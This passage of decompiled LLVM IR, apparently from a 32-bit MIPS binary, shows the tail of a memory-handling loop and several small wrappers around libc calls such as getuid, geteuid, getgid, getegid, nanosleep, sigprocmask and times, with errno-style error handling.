  store i32 -8, i32* %v1.global-to-local, align 4
  %v1_4070bc = add nuw nsw i32 %v4_4070b4, 7
  %v2_4070c0 = and i32 %v1_4070bc, 131064
  store i32 %v2_4070c0, i32* %a2.global-to-local, align 4
  %v2_4070c4 = add i32 %v2_4070c0, %v0_4070c4
  store i32 %v2_4070c4, i32* %t0.global-to-local, align 4
  %v2_4070c8 = icmp ult i32 %v0_4070c8, %v2_4070c4
  %v3_4070c8 = zext i1 %v2_4070c8 to i32
  store i32 %v3_4070c8, i32* %v0.global-to-local, align 4
  %v1_4070cc = icmp eq i1 %v2_4070c8, false
  br i1 %v1_4070cc, label %dec_label_pc_40711c, label %dec_label_pc_4070d0

dec_label_pc_4070d0:                              ; preds = %dec_label_pc_4070b4
  %v0_4070d4 = load i32, i32* %gp.global-to-local, align 4
  %v1_4070d4 = add i32 %v0_4070d4, -32084
  %v2_4070d4 = inttoptr i32 %v1_4070d4 to i32*
  %v3_4070d4 = load i32, i32* %v2_4070d4, align 4
  store i32 %v3_4070d4, i32* @t9, align 4
  %v0_4070dc = load i32, i32* @sp, align 4
  %v1_4070dc = add i32 %v0_4070dc, 16
  %v2_4070dc = inttoptr i32 %v1_4070dc to i32*
  store i32 0, i32* %v2_4070dc, align 4
  %v0_4070e0 = load i32, i32* %s6.global-to-local, align 4
  store i32 %v0_4070e0, i32* %a2.global-to-local, align 4
  %v1_4070e4 = load i32, i32* %s7.global-to-local, align 4
  store i32 %v1_4070e4, i32* @a3, align 4
  call void @__pseudo_call(i32 %v3_4070d4)
  store i32 %v2_407008, i32* %gp.global-to-local, align 4
  %v0_4070f0 = load i32, i32* %s1.global-to-local, align 4
  %v1_4070f0 = load i32, i32* %s4.global-to-local, align 4
  %v2_4070f0 = icmp eq i32 %v0_4070f0, %v1_4070f0
  br i1 %v2_4070f0, label %dec_label_pc_4070f4, label %dec_label_pc_40718c

dec_label_pc_4070f4:                              ; preds = %dec_label_pc_4070d0
  %v3_4070f8 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_4070f8, i32* @t9, align 4
  %v1_407100 = call i32 @function_4055d0()
  store i32 %v1_407100, i32* %v0.global-to-local, align 4
  store i32 %v2_407008, i32* %gp.global-to-local, align 4
  store i32 22, i32* %v1.global-to-local, align 4
  %v2_407118 = inttoptr i32 %v1_407100 to i32*
  store i32 22, i32* %v2_407118, align 4
  %v0_40711c.pre = load i32, i32* %s0.global-to-local, align 4
  %v1_40712c.pre = load i32, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_40711c

dec_label_pc_40711c:                              ; preds = %dec_label_pc_4070b4, %dec_label_pc_4070f4
  %v1_40712c = phi i32 [ %v0_4070c4, %dec_label_pc_4070b4 ], [ %v1_40712c.pre, %dec_label_pc_4070f4 ]
  %v0_407124 = phi i32 [ %v0_4070b4, %dec_label_pc_4070b4 ], [ %v0_40711c.pre, %dec_label_pc_4070f4 ]
  %v1_40711c = inttoptr i32 %v0_407124 to i32*
  %v2_40711c = load i32, i32* %v1_40711c, align 4
  store i32 %v2_40711c, i32* %v0.global-to-local, align 4
  %v1_407120 = add i32 %v0_407124, 4
  %v2_407120 = inttoptr i32 %v1_407120 to i32*
  %v3_407120 = load i32, i32* %v2_407120, align 4
  store i32 %v3_407120, i32* %v1.global-to-local, align 4
  %v1_407124 = add i32 %v0_407124, 8
  %v2_407124 = inttoptr i32 %v1_407124 to i32*
  %v3_407124 = load i32, i32* %v2_407124, align 4
  store i32 %v3_407124, i32* %s6.global-to-local, align 4
  %v1_407128 = add i32 %v0_407124, 12
  %v2_407128 = inttoptr i32 %v1_407128 to i32*
  %v3_407128 = load i32, i32* %v2_407128, align 4
  store i32 %v3_407128, i32* %s7.global-to-local, align 4
  %v2_40712c = inttoptr i32 %v1_40712c to i32*
  store i32 %v2_40711c, i32* %v2_40712c, align 4
  %v0_407130 = load i32, i32* %v1.global-to-local, align 4
  %v1_407130 = load i32, i32* %s1.global-to-local, align 4
  %v2_407130 = add i32 %v1_407130, 4
  %v3_407130 = inttoptr i32 %v2_407130 to i32*
  store i32 %v0_407130, i32* %v3_407130, align 4
  %v0_407134 = load i32, i32* %s0.global-to-local, align 4
  %v1_407134 = add i32 %v0_407134, 8
  %v2_407134 = inttoptr i32 %v1_407134 to i32*
  %v3_407134 = load i32, i32* %v2_407134, align 4
  store i32 %v3_407134, i32* %v0.global-to-local, align 4
  %v1_407138 = add i32 %v0_407134, 12
  %v2_407138 = inttoptr i32 %v1_407138 to i32*
  %v3_407138 = load i32, i32* %v2_407138, align 4
  store i32 %v3_407138, i32* %v1.global-to-local, align 4
  %v0_40713c = load i32, i32* %a2.global-to-local, align 4
  %v1_40713c = trunc i32 %v0_40713c to i16
  %v2_40713c = load i32, i32* %s1.global-to-local, align 4
  %v3_40713c = add i32 %v2_40713c, 16
  %v4_40713c = inttoptr i32 %v3_40713c to i16*
  store i16 %v1_40713c, i16* %v4_40713c, align 2
  %v0_407140 = load i32, i32* %v0.global-to-local, align 4
  %v1_407140 = load i32, i32* %s1.global-to-local, align 4
  %v2_407140 = add i32 %v1_407140, 8
  %v3_407140 = inttoptr i32 %v2_407140 to i32*
  store i32 %v0_407140, i32* %v3_407140, align 4
  %v0_407144 = load i32, i32* %v1.global-to-local, align 4
  %v1_407144 = load i32, i32* %s1.global-to-local, align 4
  %v2_407144 = add i32 %v1_407144, 12
  %v3_407144 = inttoptr i32 %v2_407144 to i32*
  store i32 %v0_407144, i32* %v3_407144, align 4
  %v0_407148 = load i32, i32* %s0.global-to-local, align 4
  %v1_407148 = add i32 %v0_407148, 18
  %v2_407148 = inttoptr i32 %v1_407148 to i8*
  %v3_407148 = load i8, i8* %v2_407148, align 1
  %v4_407148 = zext i8 %v3_407148 to i32
  store i32 %v4_407148, i32* %v0.global-to-local, align 4
  %v2_407150 = load i32, i32* %s1.global-to-local, align 4
  %v3_407150 = add i32 %v2_407150, 18
  %v4_407150 = inttoptr i32 %v3_407150 to i8*
  store i8 %v3_407148, i8* %v4_407150, align 1
  %v0_407154 = load i32, i32* %s0.global-to-local, align 4
  %v1_407154 = add i32 %v0_407154, 16
  %v2_407154 = inttoptr i32 %v1_407154 to i16*
  %v3_407154 = load i16, i16* %v2_407154, align 2
  %v4_407154 = zext i16 %v3_407154 to i32
  %v0_407158 = load i32, i32* %t0.global-to-local, align 4
  store i32 %v0_407158, i32* %s1.global-to-local, align 4
  %v0_40715c = load i32, i32* @t9, align 4
  %v2_40715c = add nsw i32 %v4_407154, -19
  store i32 %v2_40715c, i32* %a2.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_40715c)
  %v0_407164 = load i32, i32* %s0.global-to-local, align 4
  %v1_407164 = add i32 %v0_407164, 16
  %v2_407164 = inttoptr i32 %v1_407164 to i16*
  %v3_407164 = load i16, i16* %v2_407164, align 2
  %v4_407164 = zext i16 %v3_407164 to i32
  store i32 %v2_407008, i32* %gp.global-to-local, align 4
  %v2_40716c = add i32 %v4_407164, %v0_407164
  store i32 %v2_40716c, i32* %s0.global-to-local, align 4
  %v0_407170 = load i32, i32* %s3.global-to-local, align 4
  %v1_407170 = load i32, i32* %s2.global-to-local, align 4
  %v2_407170 = add i32 %v1_407170, %v0_407170
  %v2_407174 = icmp ult i32 %v2_40716c, %v2_407170
  %v3_407174 = zext i1 %v2_407174 to i32
  store i32 %v3_407174, i32* %v0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_407830.379 to i32), i32* @t9, align 4
  %v0_40717c = load i32, i32* %s1.global-to-local, align 4
  %v1_407184 = icmp eq i1 %v2_407174, false
  %v2_407184 = load i32, i32* %s4.global-to-local, align 4
  %v3_407184 = load i32, i32* %s5.global-to-local, align 4
  %v4_407184 = add i32 %v3_407184, %v2_407184
  store i32 %v4_407184, i32* @a3, align 4
  br i1 %v1_407184, label %dec_label_pc_40718c, label %dec_label_pc_4070b4

dec_label_pc_40718c:                              ; preds = %dec_label_pc_40711c, %dec_label_pc_4070d0
  %v1_40718c = phi i32 [ %v2_407184, %dec_label_pc_40711c ], [ %v1_4070f0, %dec_label_pc_4070d0 ]
  %v0_40718c = phi i32 [ %v0_40717c, %dec_label_pc_40711c ], [ %v0_4070f0, %dec_label_pc_4070d0 ]
  %v2_40718c = sub i32 %v0_40718c, %v1_40718c
  store i32 %v2_40718c, i32* %v0.global-to-local, align 4
  ret i32 %v2_40718c

; uselistorder directives
  uselistorder i32 %v2_40718c, { 1, 0 }
  uselistorder i32 %v4_407184, { 1, 0 }
  uselistorder i32 %v2_407184, { 1, 0 }
  uselistorder i32 %v2_40716c, { 1, 2, 0 }
  uselistorder i32 %v0_407124, { 1, 0, 3, 2 }
  uselistorder i32 %v0_4070c4, { 1, 0 }
  uselistorder i32 %v2_407008, { 0, 2, 1, 3, 4 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 10, 7, 9 }
  uselistorder i32* %s2.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %s1.global-to-local, { 0, 1, 3, 4, 5, 6, 7, 9, 8, 10, 2 }
  uselistorder i32* %s0.global-to-local, { 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32* %gp.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %a2.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_407830.379 to i32), { 2, 0, 1 }
  uselistorder i32 -19, { 2, 3, 0, 4, 1, 5 }
  uselistorder i32 18, { 2, 3, 4, 5, 6, 7, 8, 9, 1, 0, 10 }
  uselistorder i32 7, { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder i32 14, { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_40711c, { 1, 0 }
  uselistorder label %dec_label_pc_4070a4, { 1, 0 }
}

define i32 @function_4071d0() local_unnamed_addr {
dec_label_pc_4071d0:
  %s0.global-to-local = alloca i32, align 4
  %v0_4071f0 = call i32 @getegid()
  %v3_4071f4 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_4071f4, i32* @t9, align 4
  %v0_4071f8 = load i32, i32* @a3, align 4
  %v1_4071f8 = icmp eq i32 %v0_4071f8, 0
  store i32 %v0_4071f0, i32* %s0.global-to-local, align 4
  br i1 %v1_4071f8, label %dec_label_pc_407214, label %dec_label_pc_4071fc

dec_label_pc_4071fc:                              ; preds = %dec_label_pc_4071d0
  %v1_407200 = call i32 @function_4055d0()
  %v0_40720c = load i32, i32* %s0.global-to-local, align 4
  %v2_40720c = inttoptr i32 %v1_407200 to i32*
  store i32 %v0_40720c, i32* %v2_40720c, align 4
  store i32 -1, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_407214

dec_label_pc_407214:                              ; preds = %dec_label_pc_4071d0, %dec_label_pc_4071fc
  %v0_407214 = phi i32 [ %v0_4071f0, %dec_label_pc_4071d0 ], [ -1, %dec_label_pc_4071fc ]
  ret i32 %v0_407214

; uselistorder directives
  uselistorder label %dec_label_pc_407214, { 1, 0 }
}

define i32 @function_407230() local_unnamed_addr {
dec_label_pc_407230:
  %s0.global-to-local = alloca i32, align 4
  %v0_407250 = call i32 @geteuid()
  %v3_407254 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_407254, i32* @t9, align 4
  %v0_407258 = load i32, i32* @a3, align 4
  %v1_407258 = icmp eq i32 %v0_407258, 0
  store i32 %v0_407250, i32* %s0.global-to-local, align 4
  br i1 %v1_407258, label %dec_label_pc_407274, label %dec_label_pc_40725c

dec_label_pc_40725c:                              ; preds = %dec_label_pc_407230
  %v1_407260 = call i32 @function_4055d0()
  %v0_40726c = load i32, i32* %s0.global-to-local, align 4
  %v2_40726c = inttoptr i32 %v1_407260 to i32*
  store i32 %v0_40726c, i32* %v2_40726c, align 4
  store i32 -1, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_407274

dec_label_pc_407274:                              ; preds = %dec_label_pc_407230, %dec_label_pc_40725c
  %v0_407274 = phi i32 [ %v0_407250, %dec_label_pc_407230 ], [ -1, %dec_label_pc_40725c ]
  ret i32 %v0_407274

; uselistorder directives
  uselistorder label %dec_label_pc_407274, { 1, 0 }
}

define i32 @function_407290() local_unnamed_addr {
dec_label_pc_407290:
  %s0.global-to-local = alloca i32, align 4
  %v0_4072b0 = call i32 @getgid()
  %v3_4072b4 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_4072b4, i32* @t9, align 4
  %v0_4072b8 = load i32, i32* @a3, align 4
  %v1_4072b8 = icmp eq i32 %v0_4072b8, 0
  store i32 %v0_4072b0, i32* %s0.global-to-local, align 4
  br i1 %v1_4072b8, label %dec_label_pc_4072d4, label %dec_label_pc_4072bc

dec_label_pc_4072bc:                              ; preds = %dec_label_pc_407290
  %v1_4072c0 = call i32 @function_4055d0()
  %v0_4072cc = load i32, i32* %s0.global-to-local, align 4
  %v2_4072cc = inttoptr i32 %v1_4072c0 to i32*
  store i32 %v0_4072cc, i32* %v2_4072cc, align 4
  br label %dec_label_pc_4072d4

dec_label_pc_4072d4:                              ; preds = %dec_label_pc_407290, %dec_label_pc_4072bc
  %v4_4072dc = phi i32 [ %v0_4072b0, %dec_label_pc_407290 ], [ -1, %dec_label_pc_4072bc ]
  ret i32 %v4_4072dc

; uselistorder directives
  uselistorder label %dec_label_pc_4072d4, { 1, 0 }
}

define i32 @function_4072f0() local_unnamed_addr {
dec_label_pc_4072f0:
  %s0.global-to-local = alloca i32, align 4
  %v0_407310 = call i32 @getuid()
  %v3_407314 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_407314, i32* @t9, align 4
  %v0_407318 = load i32, i32* @a3, align 4
  %v1_407318 = icmp eq i32 %v0_407318, 0
  store i32 %v0_407310, i32* %s0.global-to-local, align 4
  br i1 %v1_407318, label %dec_label_pc_407334, label %dec_label_pc_40731c

dec_label_pc_40731c:                              ; preds = %dec_label_pc_4072f0
  %v1_407320 = call i32 @function_4055d0()
  %v0_40732c = load i32, i32* %s0.global-to-local, align 4
  %v2_40732c = inttoptr i32 %v1_407320 to i32*
  store i32 %v0_40732c, i32* %v2_40732c, align 4
  br label %dec_label_pc_407334

dec_label_pc_407334:                              ; preds = %dec_label_pc_4072f0, %dec_label_pc_40731c
  %v4_40733c = phi i32 [ %v0_407310, %dec_label_pc_4072f0 ], [ -1, %dec_label_pc_40731c ]
  ret i32 %v4_40733c

; uselistorder directives
  uselistorder label %dec_label_pc_407334, { 1, 0 }
}

define i32 @function_407350(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4073c0:
  %a0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 4140, i32* %v0.global-to-local, align 4
  %v3_407398 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_407398, i32* @t9, align 4
  store i32 4140, i32* %a0.global-to-local, align 4
  %v1_4073a8 = call i32 @function_4055d0()
  store i32 %v1_4073a8, i32* %v0.global-to-local, align 4
  store i32 -1, i32* %a0.global-to-local, align 4
  %v2_4073bc = inttoptr i32 %v1_4073a8 to i32*
  store i32 4140, i32* %v2_4073bc, align 4
  %v0_4073c0.pr = load i32, i32* %v0.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_4073c0.pr, 0
  br i1 %phitmp, label %dec_label_pc_4073d4, label %dec_label_pc_4073c4

dec_label_pc_4073c4:                              ; preds = %dec_label_pc_4073c0
  %v0_4073c8 = load i32, i32* %a0.global-to-local, align 4
  store i32 %v0_4073c8, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4073d4

dec_label_pc_4073d4:                              ; preds = %dec_label_pc_4073c0, %dec_label_pc_4073c4
  %v3_4073d4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_4073d4, i32* %v0.global-to-local, align 4
  ret i32 %v3_4073d4

; uselistorder directives
  uselistorder i32* %v0.global-to-local, { 0, 1, 3, 4, 2 }
  uselistorder label %dec_label_pc_4073d4, { 1, 0 }
}

define i32 @function_407400(%timespec* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407400:
  %s0.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to %timespec*
  %v6_407420 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp)
  %v3_407424 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_407424, i32* @t9, align 4
  %v1_407428 = icmp eq i32 %arg3, 0
  store i32 %v6_407420, i32* %s0.global-to-local, align 4
  br i1 %v1_407428, label %dec_label_pc_407444, label %dec_label_pc_40742c

dec_label_pc_40742c:                              ; preds = %dec_label_pc_407400
  %v1_407430 = call i32 @function_4055d0()
  %v0_40743c = load i32, i32* %s0.global-to-local, align 4
  %v2_40743c = inttoptr i32 %v1_407430 to i32*
  store i32 %v0_40743c, i32* %v2_40743c, align 4
  br label %dec_label_pc_407444

dec_label_pc_407444:                              ; preds = %dec_label_pc_407400, %dec_label_pc_40742c
  %v4_40744c = phi i32 [ %v6_407420, %dec_label_pc_407400 ], [ -1, %dec_label_pc_40742c ]
  ret i32 %v4_40744c

; uselistorder directives
  uselistorder label %dec_label_pc_407444, { 1, 0 }
}

define i32 @function_407460(i32 %arg1) local_unnamed_addr {
dec_label_pc_407460:
  %s1.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v3_407480 = load i32, i32* bitcast (i32** @global_var_4492e8.34 to i32*), align 4
  store i32 %arg1, i32* %s1.global-to-local, align 4
  store i32 %v3_407480, i32* %v0.global-to-local, align 4
  %v3_40748c = load i32, i32* @global_var_4493e0.407, align 4
  store i32 %v3_40748c, i32* @t9, align 4
  %v1_407490 = icmp eq i32 %v3_407480, 0
  br i1 %v1_407490, label %dec_label_pc_407494, label %dec_label_pc_4074b4

dec_label_pc_407494:                              ; preds = %dec_label_pc_407460
  %v3_407498 = call i32 @function_407fa0(i32* null)
  store i32 %v3_407498, i32* %v0.global-to-local, align 4
  %v1_4074a4 = icmp slt i32 %v3_407498, 0
  br i1 %v1_4074a4, label %dec_label_pc_4074d4, label %dec_label_pc_4074a8

dec_label_pc_4074a8:                              ; preds = %dec_label_pc_407494
  %v3_4074ac = load i32, i32* @global_var_4493e0.407, align 4
  %v2_4074b0 = load i32, i32* bitcast (i32** @global_var_4492e8.34 to i32*), align 4
  store i32 %v2_4074b0, i32* %v0.global-to-local, align 4
  %v0_4074b4.pre = load i32, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_4074b4

dec_label_pc_4074b4:                              ; preds = %dec_label_pc_407460, %dec_label_pc_4074a8
  %v0_4074c0 = phi i32 [ %v3_40748c, %dec_label_pc_407460 ], [ %v3_4074ac, %dec_label_pc_4074a8 ]
  %v0_4074bc = phi i32 [ %v3_407480, %dec_label_pc_407460 ], [ %v2_4074b0, %dec_label_pc_4074a8 ]
  %v1_4074bc = phi i32 [ %arg1, %dec_label_pc_407460 ], [ %v0_4074b4.pre, %dec_label_pc_4074a8 ]
  %v1_4074b4 = icmp eq i32 %v1_4074bc, 0
  br i1 %v1_4074b4, label %dec_label_pc_4074d8, label %dec_label_pc_4074b8

dec_label_pc_4074b8:                              ; preds = %dec_label_pc_4074b4
  call void @__pseudo_call(i32 %v0_4074c0)
  %v0_4074cc = load i32, i32* %v0.global-to-local, align 4
  %v1_4074cc = icmp sgt i32 %v0_4074cc, -1
  store i32 %v0_4074bc, i32* %v0.global-to-local, align 4
  br i1 %v1_4074cc, label %dec_label_pc_4074dc, label %dec_label_pc_4074d4

dec_label_pc_4074d4:                              ; preds = %dec_label_pc_4074b8, %dec_label_pc_407494
  br label %dec_label_pc_4074d8

dec_label_pc_4074d8:                              ; preds = %dec_label_pc_4074b4, %dec_label_pc_4074d4
  %v0_4074d8 = phi i32 [ %v0_4074bc, %dec_label_pc_4074b4 ], [ -1, %dec_label_pc_4074d4 ]
  store i32 %v0_4074d8, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4074dc

dec_label_pc_4074dc:                              ; preds = %dec_label_pc_4074b8, %dec_label_pc_4074d8
  %v4_4074e8 = phi i32 [ %v0_4074bc, %dec_label_pc_4074b8 ], [ %v0_4074d8, %dec_label_pc_4074d8 ]
  ret i32 %v4_4074e8

; uselistorder directives
  uselistorder i32 %v0_4074bc, { 1, 2, 0 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32* null, { 1, 0, 2, 7, 3, 8, 4, 5, 6 }
  uselistorder label %dec_label_pc_4074dc, { 1, 0 }
  uselistorder label %dec_label_pc_4074d8, { 1, 0 }
  uselistorder label %dec_label_pc_4074b4, { 1, 0 }
}

define i32 @function_4074f0(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4074f0:
  %a0.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %v2_407510 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_407510, label %dec_label_pc_407540, label %dec_label_pc_407514

dec_label_pc_407514:                              ; preds = %dec_label_pc_4074f0
  %v1_40750c = add i32 %arg1, -1
  %v4_407510 = icmp ult i32 %v1_40750c, 3
  %v3_407518 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_407518, i32* @t9, align 4
  %v1_40751c = icmp eq i1 %v4_407510, false
  store i32 16, i32* @a3, align 4
  br i1 %v1_40751c, label %dec_label_pc_407520, label %dec_label_pc_407544

dec_label_pc_407520:                              ; preds = %dec_label_pc_407514
  %v1_407524 = call i32 @function_4055d0()
  store i32 -1, i32* %a0.global-to-local, align 4
  %v2_40753c = inttoptr i32 %v1_407524 to i32*
  store i32 22, i32* %v2_40753c, align 4
  %v0_407548.pre.pre = load i32, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_407540

dec_label_pc_407540:                              ; preds = %dec_label_pc_4074f0, %dec_label_pc_407520
  %v0_407548.pre = phi i32 [ %arg1, %dec_label_pc_4074f0 ], [ %v0_407548.pre.pre, %dec_label_pc_407520 ]
  store i32 16, i32* @a3, align 4
  br label %dec_label_pc_407544

dec_label_pc_407544:                              ; preds = %dec_label_pc_407514, %dec_label_pc_407540
  %v0_407548 = phi i32 [ %arg1, %dec_label_pc_407514 ], [ %v0_407548.pre, %dec_label_pc_407540 ]
  %v7_407548 = call i32 @sigprocmask(i32 %v0_407548, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp)
  %v3_40754c = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_40754c, i32* @t9, align 4
  store i32 %v7_407548, i32* %s0.global-to-local, align 4
  %v0_407554 = load i32, i32* @a3, align 4
  %v1_407554 = icmp eq i32 %v0_407554, 0
  store i32 %v7_407548, i32* %a0.global-to-local, align 4
  br i1 %v1_407554, label %dec_label_pc_407570, label %dec_label_pc_407558

dec_label_pc_407558:                              ; preds = %dec_label_pc_407544
  %v1_40755c = call i32 @function_4055d0()
  store i32 -1, i32* %a0.global-to-local, align 4
  %v0_40756c = load i32, i32* %s0.global-to-local, align 4
  %v2_40756c = inttoptr i32 %v1_40755c to i32*
  store i32 %v0_40756c, i32* %v2_40756c, align 4
  %v0_407578.pre = load i32, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_407570

dec_label_pc_407570:                              ; preds = %dec_label_pc_407544, %dec_label_pc_407558
  %v0_407578 = phi i32 [ %v7_407548, %dec_label_pc_407544 ], [ %v0_407578.pre, %dec_label_pc_407558 ]
  ret i32 %v0_407578

; uselistorder directives
  uselistorder i32* %a0.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 22, { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_407570, { 1, 0 }
  uselistorder label %dec_label_pc_407544, { 1, 0 }
  uselistorder label %dec_label_pc_407540, { 1, 0 }
}

define i32 @function_407590(%tms* %arg1) local_unnamed_addr {
dec_label_pc_407590:
  %s0.global-to-local = alloca i32, align 4
  %v3_4075b0 = call i32 @times(%tms* %arg1)
  %v3_4075b4 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_4075b4, i32* @t9, align 4
  %v0_4075b8 = load i32, i32* @a3, align 4
  %v1_4075b8 = icmp eq i32 %v0_4075b8, 0
  store i32 %v3_4075b0, i32* %s0.global-to-local, align 4
  br i1 %v1_4075b8, label %dec_label_pc_4075d4, label %dec_label_pc_4075bc

dec_label_pc_4075bc:                              ; preds = %dec_label_pc_407590
  %v1_4075c0 = call i32 @function_4055d0()
  %v0_4075cc = load i32, i32* %s0.global-to-local, align 4
  %v2_4075cc = inttoptr i32 %v1_4075c0 to i32*
  store i32 %v0_4075cc, i32* %v2_4075cc, align 4
  br label %dec_label_pc_4075d4

dec_label_pc_4075d4:                              ; preds = %dec_label_pc_407590, %dec_label_pc_4075bc
  %v4_4075dc = phi i32 [ %v3_4075b0, %dec_label_pc_407590 ], [ -1, %dec_label_pc_4075bc ]
  ret i32 %v4_4075dc

; uselistorder directives
  uselistorder label %dec_label_pc_4075d4, { 1, 0 }
}

define i32 @function_4075f0(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4075f0:
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %s0.global-to-local, align 4
  store i32 %tmp, i32* %s1.global-to-local, align 4
  %v4_407624 = inttoptr i32 %arg2 to i32*
  %v5_407624 = call i32 @function_405660(i32* %v4_407624, i32 0, i32 160)
  store i32 %v5_407624, i32* %v0.global-to-local, align 4
  %v2_40762c = load i32, i32* %arg1, align 4
  store i32 %v2_40762c, i32* %v0.global-to-local, align 4
  %v0_407634 = load i32, i32* %s0.global-to-local, align 4
  %v1_407634 = add i32 %v0_407634, 4
  %v2_407634 = inttoptr i32 %v1_407634 to i32*
  store i32 0, i32* %v2_407634, align 4
  %v0_407638 = load i32, i32* %v0.global-to-local, align 4
  %v1_407638 = load i32, i32* %s0.global-to-local, align 4
  %v2_407638 = inttoptr i32 %v1_407638 to i32*
  store i32 %v0_407638, i32* %v2_407638, align 4
  %v0_40763c = load i32, i32* %s1.global-to-local, align 4
  %v1_40763c = add i32 %v0_40763c, 16
  %v2_40763c = inttoptr i32 %v1_40763c to i32*
  %v3_40763c = load i32, i32* %v2_40763c, align 4
  store i32 %v3_40763c, i32* %v0.global-to-local, align 4
  %v1_407640 = add i32 %v0_40763c, 20
  %v2_407640 = inttoptr i32 %v1_407640 to i32*
  %v3_407640 = load i32, i32* %v2_407640, align 4
  store i32 %v3_407640, i32* %v1.global-to-local, align 4
  %v1_407644 = load i32, i32* %s0.global-to-local, align 4
  %v2_407644 = add i32 %v1_407644, 16
  %v3_407644 = inttoptr i32 %v2_407644 to i32*
  store i32 %v3_40763c, i32* %v3_407644, align 4
  %v0_407648 = load i32, i32* %v1.global-to-local, align 4
  %v1_407648 = load i32, i32* %s0.global-to-local, align 4
  %v2_407648 = add i32 %v1_407648, 20
  %v3_407648 = inttoptr i32 %v2_407648 to i32*
  store i32 %v0_407648, i32* %v3_407648, align 4
  %v0_40764c = load i32, i32* %s1.global-to-local, align 4
  %v1_40764c = add i32 %v0_40764c, 24
  %v2_40764c = inttoptr i32 %v1_40764c to i32*
  %v3_40764c = load i32, i32* %v2_40764c, align 4
  store i32 %v3_40764c, i32* %v0.global-to-local, align 4
  %v1_407654 = load i32, i32* %s0.global-to-local, align 4
  %v2_407654 = add i32 %v1_407654, 24
  %v3_407654 = inttoptr i32 %v2_407654 to i32*
  store i32 %v3_40764c, i32* %v3_407654, align 4
  %v0_407658 = load i32, i32* %s1.global-to-local, align 4
  %v1_407658 = add i32 %v0_407658, 28
  %v2_407658 = inttoptr i32 %v1_407658 to i32*
  %v3_407658 = load i32, i32* %v2_407658, align 4
  store i32 %v3_407658, i32* %v0.global-to-local, align 4
  %v1_407660 = load i32, i32* %s0.global-to-local, align 4
  %v2_407660 = add i32 %v1_407660, 28
  %v3_407660 = inttoptr i32 %v2_407660 to i32*
  store i32 %v3_407658, i32* %v3_407660, align 4
  %v0_407664 = load i32, i32* %s1.global-to-local, align 4
  %v1_407664 = add i32 %v0_407664, 32
  %v2_407664 = inttoptr i32 %v1_407664 to i32*
  %v3_407664 = load i32, i32* %v2_407664, align 4
  store i32 %v3_407664, i32* %v0.global-to-local, align 4
  %v1_40766c = load i32, i32* %s0.global-to-local, align 4
  %v2_40766c = add i32 %v1_40766c, 32
  %v3_40766c = inttoptr i32 %v2_40766c to i32*
  store i32 %v3_407664, i32* %v3_40766c, align 4
  %v0_407670 = load i32, i32* %s1.global-to-local, align 4
  %v1_407670 = add i32 %v0_407670, 36
  %v2_407670 = inttoptr i32 %v1_407670 to i32*
  %v3_407670 = load i32, i32* %v2_407670, align 4
  store i32 %v3_407670, i32* %v0.global-to-local, align 4
  %v1_407678 = load i32, i32* %s0.global-to-local, align 4
  %v2_407678 = add i32 %v1_407678, 36
  %v3_407678 = inttoptr i32 %v2_407678 to i32*
  store i32 %v3_407670, i32* %v3_407678, align 4
  %v0_40767c = load i32, i32* %s1.global-to-local, align 4
  %v1_40767c = add i32 %v0_40767c, 40
  %v2_40767c = inttoptr i32 %v1_40767c to i32*
  %v3_40767c = load i32, i32* %v2_40767c, align 4
  store i32 %v3_40767c, i32* %v0.global-to-local, align 4
  %v0_407680 = load i32, i32* %s0.global-to-local, align 4
